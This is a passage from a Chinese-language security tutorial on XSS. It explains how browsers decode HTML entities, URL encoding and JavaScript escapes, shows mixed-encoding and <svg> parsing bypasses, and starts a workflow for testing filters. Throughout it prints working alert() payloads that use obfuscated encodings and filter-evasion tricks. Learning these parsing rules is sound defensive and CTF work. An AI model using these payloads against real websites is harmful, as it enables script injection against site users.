<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;div\&gt;&amp;#60;img src&#x3D;x onerror&#x3D;alert(&quot;xss&quot;)&amp;#62;&lt;&#x2F;div\&gt;  </span><br></pre></td></tr></table></figure>
<p>如下图，此时在页面上显示的是经过转义的内容：</p>
<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/2.png"></p>
<p>这看上去是一个标准的标签语言，但并不会触发xss，因为当前HTML解析器处于“数据状态”，不会转换到“标签开始状态”，所以就不会建立新的标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”而不是XSS攻击向量。</p>
<p><strong>（2）属性值状态中的字符引用：</strong>属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;\&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<p><strong>（3）RCDATA状态中的字符引用：</strong>然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素：</p>
<ol>
<li> 空元素(Void elements)，如 <code>&lt;area&gt;</code>、<code>&lt;br&gt;</code>、<code>&lt;base&gt;</code> 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。</li>
<li> 原始文本元素(Raw text elements)，有 <code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>。原始文本元素可以容纳文本。</li>
<li> RCDATA元素(RCDATA elements)，有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code>。RCDATA元素可以容纳文本和字符引用。</li>
<li> 外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。</li>
<li> 基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。</li>
</ol>
<p>注意到RCDATA元素中有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以下面这个语句触发不了XSS：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;textarea\&gt;&amp;#60;script&amp;#62;alert(&quot;xss&quot;)&amp;#60;&#x2F;script&amp;#62;&lt;&#x2F;textarea\&gt;  </span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/3.png"></p>
<p>但是如果直接放进去标签的内容呢，不带转义字符呢，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;textarea\&gt;&lt;script\&gt;alert(&quot;xss&quot;)&lt;&#x2F;script\&gt;&lt;&#x2F;textarea\&gt;  </span><br></pre></td></tr></table></figure>
<p>同样也是不会触发XSS的</p>
<p>这涉及到了RCDATA的一个特殊的情况。即在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“&lt;”字符，它会转换到“RCDATA小于号状态”。如果“&lt;”字符后没有紧跟着“/”和对应的标签名，解析器会转换回“RCDATA状态”，并不会进入“标签开始状态”的。这意味着在RCDATA元素标签的内容中，唯一能够被解析器认做是标签的就只有 <code>&lt;/textarea&gt;</code> 或者 <code>&lt;/title&gt;</code>，因此，在 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 的内容中不会创建标签，就不会有脚本能够执行了。</p>
<p>另外还有一点要注意：我们从上面HTML的五类元素中还发现有一个原始文本元素 <code>&lt;script&gt;</code> 在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。浏览器看不懂中间这堆编码是和啥东西，所以也不会被执行，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/4.png"></p>
<p>那么如何才能让里面的内容进行转义并执行弹窗呢，这里需要利用到XSS的一个黑魔法——“svg”，我们下文中会提及。</p>
<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a><a href="#URL%E7%BC%96%E7%A0%81" title="URL编码"></a>URL编码</h2><p>我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;&quot;...&quot;\&gt;xx&lt;&#x2F;a\&gt;  </span><br><span class="line">2  </span><br><span class="line">3  &lt;iframe src\&#x3D;&quot;...&quot;\&gt;  </span><br></pre></td></tr></table></figure>
<p>下面给出几个实例。</p>
<ul>
<li>  <code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29\&gt;test&lt;&#x2F;a\&gt; </span><br></pre></td></tr></table></figure>
<ul>
<li>  <code>&lt;iframe src=javascript:alert(&quot;xss&quot;)&gt;&lt;/iframe&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;iframe src\&#x3D;&quot;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&quot;\&gt;&lt;&#x2F;iframe\&gt; </span><br></pre></td></tr></table></figure>
<p>注意，伪协议头 <code>javascript:</code> 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。就比如说 <code>http://www.baidu.com</code> 可以被URL编码为 <code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>，但是不能把协议也进URL编码：<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code> 。</p>
<p>但是伪协议头 <code>javascript:</code> 可以进行HTML编码。</p>
<h2 id="Javascript-编码"><a href="#Javascript-编码" class="headerlink" title="Javascript 编码"></a><a href="#Javascript-%E7%BC%96%E7%A0%81" title="Javascript 编码"></a>Javascript 编码</h2><p>我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p>
<p>Javascript 中可以识别的编码类型有：</p>
<ul>
<li>  Unicode 编码</li>
<li>  八进制编码</li>
<li>  十六进制编码</li>
</ul>
<p>一般情况下我们使用Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。</p>
<h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a><a href="#Unicode-%E7%BC%96%E7%A0%81" title="Unicode 编码"></a>Unicode 编码</h3><ul>
<li>  <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;\\u0061\\u006C\\u0065\\u0072\\u0074(&quot;xss&quot;)&lt;&#x2F;script\&gt;  </span><br><span class="line">2  &lt;script\&gt;\\u0061\\u006C\\u0065\\u0072\\u0074(&quot;\\u0078\\u0073\\u0073&quot;)&lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<ul>
<li>  <code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(&quot;xss&quot;)&gt;test&lt;&#x2F;a\&gt;</span><br><span class="line">2  &lt;a href\&#x3D;javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(&quot;\\u0078\\u0073\\u0073&quot;)&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<p>但要注意，我们同样也不能对伪协议头 <code>javascript:</code> 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。</p>
<h3 id="在DOM环境中的JavaScript编码"><a href="#在DOM环境中的JavaScript编码" class="headerlink" title="在DOM环境中的JavaScript编码"></a><a href="#%E5%9C%A8DOM%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84JavaScript%E7%BC%96%E7%A0%81" title="在DOM环境中的JavaScript编码"></a>在DOM环境中的JavaScript编码</h3><p>对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，像下面的XSS向量是不能直接执行的：</p>
<ul>
<li>  <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;\\141\\154\\145\\162\\164(&quot;xss&quot;)&lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<ul>
<li>  <code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;javascript:\\x61\\x6c\\x65\\x72\\x74(&quot;xss&quot;)&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>

<p>如下图，插入之后没有任何反应：</p>
<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/5.png"></p>
<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/6.png"></p>
<p>要想让他们能够执行我们要将他们放在DOM环境中，即DOM型的XSS。</p>
<p>测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;div id\&#x3D;&#39;s&#39;\&gt;test&lt;&#x2F;div\&gt;  </span><br><span class="line">2  </span><br><span class="line">3  &lt;script\&gt;  </span><br><span class="line">4   var search &#x3D; &quot;...&quot;;  </span><br><span class="line">5   document.getElementById(&#39;s&#39;).innerHTML &#x3D; search;  </span><br><span class="line">6  &lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<p>以上情况很多都是出现在你搜索后，显示你所查询的关键字，变量 <code>search</code> 是一个可控点，当我们查询一个XSS攻击向量后，变量 <code>search</code> 就会被赋值为这个XSS向量，从而插入到div标签中触发XSS，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;div id\&#x3D;&#39;s&#39;\&gt;test&lt;&#x2F;div\&gt;  </span><br><span class="line">2  </span><br><span class="line">3  &lt;script\&gt;  </span><br><span class="line">4   var search &#x3D; &quot;&lt;iframe src\&#x3D;javascript:alert(&#39;xss&#39;)&gt;&lt;&#x2F;iframe\&gt;&quot;;  </span><br><span class="line">5   document.getElementById(&#39;s&#39;).innerHTML &#x3D; search;  </span><br><span class="line">6  &lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/7.png"></p>
<p>此时如果过滤了 <code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>、<code>&amp;</code>、<code>%</code> 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS向量全部编码，即 <code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code> 的以下编码都可以弹窗：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1  &#x2F;&#x2F; Unicode编码  </span><br><span class="line">2  \\u003C\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u0020\\u0073\\u0072\\u0063\\u003D\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u0029\\u003E\\u003C\\u002F\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u003E  </span><br><span class="line">3  </span><br><span class="line">4  &#x2F;&#x2F; 八进制编码 </span><br><span class="line">5  \\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\72\\141\\154\\145\\162\\164\\50\\47\\170\\163\\163\\47\\51\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76  </span><br><span class="line">6  </span><br><span class="line">7  &#x2F;&#x2F; 十六进制编码  </span><br><span class="line">8  \\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e  </span><br></pre></td></tr></table></figure>
<p>还有一种让八进制和十六进制编码的XSS攻击向量执行的方式便是将XSS向量放在某个能把字符串当做JavaScript代码来执行的函数里，比如eval()、setTimeout()、setInterval()等函数。如下示例：</p>
<ul>
<li>  <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;eval(&quot;\\141\\154\\145\\162\\164\\50\\42\\170\\163\\163\\42\\51&quot;)&lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<ul>
<li>  <code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;javascript:eval(&quot;\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x78\\x73\\x73\\x22\\x29&quot;)&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<ul>
<li>  <code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;img src\&#x3D;x onerror\&#x3D;eval(&#39;\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29&#39;)&gt;  </span><br></pre></td></tr></table></figure>
<p>或者也可以直接将一整段js代码编码后放入eval()函数中执行。</p>
<h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a><a href="#%E6%B7%B7%E5%90%88%E7%BC%96%E7%A0%81" title="混合编码"></a>混合编码</h2><p><strong>混合编码就是对一个XSS向量同时进行多种编码，如下示例：</strong></p>
<ul>
<li>  <code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1  &#x2F;&#x2F; 对javascript:进行HTML编码, 对alert(&quot;xss&quot;)进行URL编码  </span><br><span class="line">2  &lt;a href\&#x3D;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;%61%6c%65%72%74%28%22%78%73%73%22%29\&gt;test&lt;&#x2F;a\&gt;  </span><br><span class="line">3  </span><br><span class="line">4  &#x2F;&#x2F; 对javascript:进行HTML编码, 对alert进行Unicode编码  </span><br><span class="line">5  &lt;a href\&#x3D;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;\\u0061\\u006C\\u0065\\u0072\\u0074(&quot;xss&quot;)&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>

<p><strong>也可以利用解码顺序进行混合编码，如下示例：</strong></p>
<ul>
<li>  <code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<p>首先对“alert”进行JavaScript Unicode编码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(&quot;xss&quot;)&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>

<p>然后再对 <code>\u0061\u006c\u0065\u0072\u0074</code> 进行URL编码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&quot;xss&quot;)&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>

<p>最后对标签中的 <code>javascript:%5c%75...%37%34(&quot;xss&quot;)</code> 整体进行HTML编码即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;\&gt;test&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<h2 id="SVG：XSS的一个黑魔法"><a href="#SVG：XSS的一个黑魔法" class="headerlink" title="SVG：XSS的一个黑魔法"></a><a href="#SVG%EF%BC%9AXSS%E7%9A%84%E4%B8%80%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95" title="SVG：XSS的一个黑魔法"></a>SVG：XSS的一个黑魔法</h2><p>我们在上文HTML编码那里最后留了一个坑，即HTML的五类元素中，像 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。</p>
<p>也就是说，向下面这样的代码，浏览器不会对其中的HTML实体字符进行解码，也就不会执行并触发XSS了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;&#x2F;script\&gt;  </span><br><span class="line">2  &lt;script\&gt;alert&amp;#40;1)&lt;&#x2F;script\&gt;  </span><br><span class="line">3  &lt;script\&gt;alert&amp;#40;1&amp;#41;&lt;&#x2F;script\&gt;  </span><br></pre></td></tr></table></figure>
<p>那如何绕过HTML原始文本元素进而执行HTML实体解码呢，这涉及到了 <code>&lt;svg&gt;</code> 的魔力，那是一种特殊的触发效果，单纯script标签内加载html实体编码，只会当做文本，没有任何触发结果，如下图：</p>
<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/8.png"></p>
<p>但是当在前面加上 <code>&lt;svg&gt;</code> 后，却成功弹窗了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;svg&gt;&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;&#x2F;script&gt;  </span><br><span class="line">2  &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;&#x2F;script&gt;  </span><br><span class="line">3  &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;&#x2F;script&gt;  </span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/9.png"></p>
<p>这是为什么呢？</p>
<p>是因为 <code>&lt;svg&gt;</code> 标签属于HTML五大元素中的外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释，也就是说在解析到<code>&lt;svg&gt;</code> 标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML解析中，实体编码会自动解码成相应的字符，重新来一遍标签开启状态，此时就会执行XSS了。如下图，弹窗后我们查看页面源码。发现原本不能被HTML解码的内容被 <code>&lt;svg&gt;</code> 标签自动解码了：</p>
<p><img src="/2021/02/20/XSS-%E9%82%A3%E4%BA%9B%E4%B8%96%E4%BA%BA%E7%9A%86%E7%9F%A5%E7%9A%84%E4%BA%8B/10.png"></p>
<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2020/11/30/Web%E5%AE%89%E5%85%A8/XSS%E4%B8%8ECSRF%E7%B1%BBCTF%E4%BE%8B%E9%A2%98/#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2%EF%BC%88%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98cookie%EF%BC%89">[CISCN2019 华东北赛区]Web2</a> 这道题运用的就是这个知识点。</p>
<h1 id="XSS-测试流程思路"><a href="#XSS-测试流程思路" class="headerlink" title="XSS 测试流程思路"></a><a href="#XSS-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E6%80%9D%E8%B7%AF" title="XSS 测试流程思路"></a>XSS 测试流程思路</h1><p>下面让我们来看一下XSS绕过的测试流程。</p>
<p>现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试：</p>
<ol>
<li> 暴力测试（输入大量的payload，看返回结果）</li>
<li> 根据正则推算</li>
<li> 利用浏览器bug</li>
</ol>
<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a><a href="#%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95" title="初步测试"></a>初步测试</h2><p>（1）尝试插入比较正常的HTML标签，例如：<code>&lt;a&gt;</code>、<code>&lt;b&gt;</code>、<code>&lt;i&gt;</code>、<code>&lt;u&gt;</code> 等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</p>
<p>（2）尝试插入不闭合的标签，例如：<code>&lt;a</code>、<code>&lt;b</code>、<code>i&gt;</code>、<code>u&gt;</code>、<code>&lt;img</code> 等，然后看一下返回响应，是否对开放的标签也有过滤。</p>
<p>（3）然后测试几种常见的XSS向量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;script\&gt;alert(1)&lt;&#x2F;script\&gt;  </span><br><span class="line">2  &lt;script\&gt;prompt(1)&lt;&#x2F;script\&gt;  </span><br><span class="line">3  &lt;script\&gt;confirm(1)&lt;&#x2F;script\&gt;  </span><br><span class="line">4  ......  </span><br></pre></td></tr></table></figure>

<p>看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了 alert、prompt、confirm 等字符，再尝试大小写的组合：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;scRiPt\&gt;alert(1);&lt;&#x2F;scrIPt\&gt;  </span><br></pre></td></tr></table></figure>
<p>（4）如果过滤器仅仅是把 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签过滤掉，那么可以用双写的方式来绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;scr&lt;script\&gt;ipt&gt;alert(1)&lt;&#x2F;scr&lt;script\&gt;ipt&gt;  </span><br></pre></td></tr></table></figure>
<p>这样当 <code>&lt;script&gt;</code> 标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。</p>
<p>（5）用 <code>&lt;a href</code> 标签来测试，看返回响应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;\&gt;click&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<p>看看 <code>&lt;a</code> 标签是否被过滤，href 是否被过滤，href里的数据是否被过滤了。如果没有数据被过滤，插入javascript伪协议看看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1  &lt;a href\&#x3D;&quot;javascript:alert(1)&quot;\&gt;click&lt;&#x2F;a\&gt;  </span><br></pre></td></tr></table></figure>
<p>看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。</p>
<p>继续测试事件触发执行javascript：</p>
